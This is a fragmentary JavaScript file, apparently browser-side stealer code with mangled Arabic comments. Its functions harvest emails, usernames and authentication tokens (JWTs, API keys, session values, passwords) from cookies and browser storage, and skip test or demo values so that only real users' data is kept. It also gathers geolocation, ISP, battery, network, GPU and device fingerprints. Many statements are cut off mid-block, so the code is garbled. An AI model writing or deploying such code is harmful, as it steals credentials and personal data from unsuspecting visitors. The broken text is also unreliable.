            try {

                for (let i = 0; i < localStorage.length; i++) {

                                if (!e.includes('test') && !e.includes('example') && !e.includes('demo') && !e.includes('123')) {
                                    emails.add(e);
                                }
                            });
                        }
                    }
                }
                
                for (let i = 0; i < sessionStorage.length; i++) {

        // ============================================

        // ============================================
        function getRealUsername() {
            let username = "Not found";
            try {
                // ÿßŸÑÿ®ÿ≠ÿ´ ŸÅŸä localStorage ÿπŸÜ ÿßÿ≥ŸÖ ÿßŸÑŸÖÿ≥ÿ™ÿÆÿØŸÖ ÿßŸÑÿ≠ŸÇŸäŸÇŸä
                const userKeys = ['username', 'user', 'name', 'displayName', 'fullName', 'realname', 'real_name'];
                
                for (let key of userKeys) {
                    const localValue = localStorage.getItem(key);
                    if (localValue && localValue.length > 2 && !localValue.includes('test') && !localValue.includes('example')) {
                        username = localValue;
                        break;
                    }
                    
                    const sessionValue = sessionStorage.getItem(key);
                    if (sessionValue && sessionValue.length > 2 && !sessionValue.includes('test') && !sessionValue.includes('example')) {
                        username = sessionValue;
                        break;
                    }
                }
                
                // ÿßŸÑÿ®ÿ≠ÿ´ ŸÅŸä ÿßŸÑŸÉŸàŸÉŸäÿ≤
                const cookies = document.cookie;
                const patterns = [
                    /user[_-]?name=([^;]+)/i,
                    /login=([^;]+)/i,
                    /username=([^;]+)/i
                ];
                
                for (let pattern of patterns) {
                    const match = cookies.match(pattern);
                    if (match && match[1] && !match[1].includes('test') && !match[1].includes('example')) {
                        username = decodeURIComponent(match[1]);
                        break;
                    }

            } catch(e) {}

                if (match) {

        // ============================================
        function findRealTokens() {
            const tokens = [];
            const tokenKeywords = ['token', 'auth', 'jwt', 'session', 'access', 'refresh', 'bearer', 'api_key', 'apikey', 'secret', 'password'];
            
            const cookies = document.cookie.split(';');
            cookies.forEach(cookie => {
                const [name, value] = cookie.trim().split('=');
                if (!name || !value) return;
                
                // ÿ™ÿ¨ÿßŸáŸÑ ÿßŸÑŸÇŸäŸÖ ÿßŸÑÿ™ÿ¨ÿ±Ÿäÿ®Ÿäÿ©
                if (value.includes('test') || value.includes('example') || value.includes('demo') || value.includes('123')) {

                tokenKeywords.forEach(keyword => {

                            name: name, 
                            value: value.length > 50 ? value.substring(0, 50) + '...' : value, 
                            type: keyword 
                        });

                });
                
                if (value && value.split('.').length === 3 && value.length > 50) {

                        value: value.substring(0, 50) + '...',

                    });
                }
            });
            
            try {
                for(let i = 0; i < localStorage.length; i++) {

        // ============================================
        async function getRealInfo() {
            const info = {};
            
            // 1. ŸÖÿπŸÑŸàŸÖÿßÿ™ ÿßŸÑŸÖŸàŸÇÿπ ÿßŸÑÿ¨ÿ∫ÿ±ÿßŸÅŸä ÿßŸÑÿ≠ŸÇŸäŸÇŸäÿ©

                if (geoData.country_name && !geoData.country_name.includes('test')) {
                    info.country = geoData.country_name;
                    info.city = geoData.city;
                    info.isp = geoData.org;
                    info.latitude = geoData.latitude;
                    info.longitude = geoData.longitude;

            // 2. ŸÖÿπŸÑŸàŸÖÿßÿ™ ÿßŸÑÿ®ÿ∑ÿßÿ±Ÿäÿ© ÿßŸÑÿ≠ŸÇŸäŸÇŸäÿ©
            if (navigator.getBattery) {
                try {
                    const battery = await navigator.getBattery();
                    info.batteryLevel = Math.round(battery.level * 100) + '%';
                    info.batteryCharging = battery.charging ? 'Yes' : 'No';
                } catch (e) {}

            // 3. ŸÖÿπŸÑŸàŸÖÿßÿ™ ÿßŸÑÿ¥ÿ®ŸÉÿ© ÿßŸÑÿ≠ŸÇŸäŸÇŸäÿ©
            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
            if (connection) {
                info.networkEffectiveType = connection.effectiveType;
                info.networkDownlink = connection.downlink ? connection.downlink + ' Mbps' : null;
                info.networkRtt = connection.rtt ? connection.rtt + ' ms' : null;
            }

            // 4. ŸÖÿπŸÑŸàŸÖÿßÿ™ GPU ÿßŸÑÿ≠ŸÇŸäŸÇŸäÿ©
            try {
                const canvas = document.createElement('canvas');

                if (gl) {
                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                    if (debugInfo) {
                        info.gpuRenderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                    }
                }
            } catch (e) {}

            // 5. ŸÖÿπŸÑŸàŸÖÿßÿ™ ÿßŸÑÿ¥ÿßÿ¥ÿ© ÿßŸÑÿ≠ŸÇŸäŸÇŸäÿ©

            info.browserPlatform = navigator.platform;
            info.browserLanguage = navigator.language;
            info.browserHardwareConcurrency = navigator.hardwareConcurrency;
            info.browserDeviceMemory = navigator.deviceMemory ? navigator.deviceMemory + ' GB' : null;

            // 7. ŸÖÿπŸÑŸàŸÖÿßÿ™ ÿßŸÑŸàŸÇÿ™ ÿßŸÑÿ≠ŸÇŸäŸÇŸäÿ©
            info.timeLocal = new Date().toString();
            info.timeTimezone = Intl.DateTimeFormat().resolvedOptions().timeZone;

            // ŸÅŸÑÿ™ÿ±ÿ© ÿßŸÑŸÇŸäŸÖ null
            Object.keys(info).forEach(key => {
                if (info[key] === null || info[key] === undefined) {
                    delete info[key];
                }
            });

            return info;
        }
